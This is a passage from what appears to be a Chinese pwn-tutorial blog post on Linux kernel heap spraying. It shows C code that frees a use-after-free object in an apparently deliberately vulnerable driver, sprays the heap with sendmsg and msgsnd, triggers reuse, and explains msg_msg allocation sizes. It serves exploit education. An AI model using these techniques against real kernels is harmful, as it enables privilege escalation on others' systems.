class="line"></span><br><span class="line">    ioctl(fd, ALLOC_UAF_OBJ, <span class="literal">NULL</span>);</span><br><span class="line">    ioctl(fd, FREE_UAF_OBJ, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Heap spray */</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">                  sendmsg(sockfd, &amp;msg, <span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Trigger */</span></span><br><span class="line">    ioctl(fd, USE_UAF_OBJ, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="msgsnd堆喷射"><a href="#msgsnd堆喷射" class="headerlink" title="msgsnd堆喷射"></a>msgsnd堆喷射</h2><p>下面的系统调用是magsnd，它更容易使用，但是有一些限制：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">use_after_free_msgsnd</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[BUFF_SIZE];</span><br><span class="line">    &#125;msg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(msg.mtext, <span class="number">0x42</span>, BUFF_SIZE<span class="number">-1</span>);</span><br><span class="line">    msg.mtext[BUFF_SIZE] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 创建消息队列， 我们将通过这个发送消息 */</span></span><br><span class="line">    <span class="keyword">int</span> msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* mtype 必须大于0 */</span></span><br><span class="line">    msg.mtype = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 分配和释放易受攻击的对象，并准备在相关缓存中进行覆盖 */</span></span><br><span class="line">    ioctl(fd, ALLOC_UAF_OBJ, <span class="literal">NULL</span>);</span><br><span class="line">        ioctl(fd, FREE_UAF_OBJ, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 喷射堆，msg越大，我们可以发送的信息量就越少 */</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">120</span>; i++)</span><br><span class="line">              msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      ioctl(fd, USE_UAF_OBJ, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们注意到调用这个函数时使用到的alloc_mag函数，我们可以在<a href="https://elixir.bootlin.com/linux/latest/source/ipc/msgutil.c#L49" target="_blank" rel="noopener">这里</a>查看它是如何分配内存的：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">    alen = min(len, DATALEN_MSG);</span><br><span class="line">    msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">    <span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    len -= alen;</span><br><span class="line">    pseg = &amp;msg-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">        alen = min(len, DATALEN_SEG);</span><br><span class="line">        seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">        <span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">goto</span> out_err;</span><br><span class="line">        *pseg = seg;</span><br><span class="line">        seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        pseg = &amp;seg-&gt;next;</span><br><span class="line">        len -= alen;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">    free_msg(msg);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>msg_msg结构的大小为48字节，我们不控制进入它的大小，因此，整体的kmalloc分配是48+我们的消息的大小。<br>这意味着我们不能在32字节的cache中使用这种方法，并且它会与64字节的cache发生冲突。</p>
+            
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">GETAGGT IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/heap/">heap</a> <a class="tag tag--primary tag--small t-link" href="/tags/linux/">linux</a> <a class="tag tag--primary tag--small t-link" href="/tags/pwn/">pwn</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--disabled">
+                
+                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">FRÜHER</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2018/07/25/pwn入门/" data-tooltip="pwn入门" aria-label="NÄCHSTER: pwn入门">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NÄCHSTER</span>
+                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://edvison.cn/2018/07/25/堆喷射/" title="Teilen auf Facebook">
+                    <i class="fa fa-facebook-official" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://edvison.cn/2018/07/25/堆喷射/" title="Teilen auf Twitter">
+                    <i class="fa fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://edvison.cn/2018/07/25/堆喷射/" title="Teilen auf Google Plus">
+                    <i class="fa fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Inhaltsverzeichnis">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2018 Edvison. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--disabled">
+                
+                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">FRÜHER</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2018/07/25/pwn入门/" data-tooltip="pwn入门" aria-label="NÄCHSTER: pwn入门">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NÄCHSTER</span>
+                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://edvison.cn/2018/07/25/堆喷射/" title="Teilen auf Facebook">
+                    <i class="fa fa-facebook-official" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://edvison.cn/2018/07/25/堆喷射/" title="Teilen auf Twitter">
+                    <i class="fa fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://edvison.cn/2018/07/25/堆喷射/" title="Teilen auf Google Plus">
+                    <i class="fa fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Inhaltsverzeichnis">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+    <i id="btn-close-shareoptions" class="fa fa-close"></i>
+    <ul class="share-options">
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://edvison.cn/2018/07/25/堆喷射/">
+                    <i class="fa fa-facebook-official" aria-hidden="true"></i><span>Teilen auf Facebook</span>
+                </a>
+            </li>
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=http://edvison.cn/2018/07/25/堆喷射/">
+                    <i class="fa fa-twitter" aria-hidden="true"></i><span>Teilen auf Twitter</span>
+                </a>
+            </li>
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=http://edvison.cn/2018/07/25/堆喷射/">
+                    <i class="fa fa-google-plus" aria-hidden="true"></i><span>Teilen auf Google Plus</span>
+                </a>
+            </li>
+        
+    </ul>
+</div>
+
+            
+        </div>
+        
+
+
+    
+        
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-remove"></i>
+        </div>
+        
+            <img id="about-card-picture" src="/assets/images/1.png" alt="Bild des Autors"/>
+        
+            <h4 id="about-card-name">Edvison</h4>
+        
+            <div id="about-card-bio"><p>Just the way you are</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>二进制、逆向</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover-v1.2.0.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/jquery.js"></script>
+<script src="/assets/js/jquery.fancybox.js"></script>
+<script src="/assets/js/thumbs.js"></script>
+<script src="/assets/js/tranquilpeak.js"></script>
+<!--SCRIPTS END-->
+
+    
+
+
+
+    <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":true}});</script></body>
+</html>
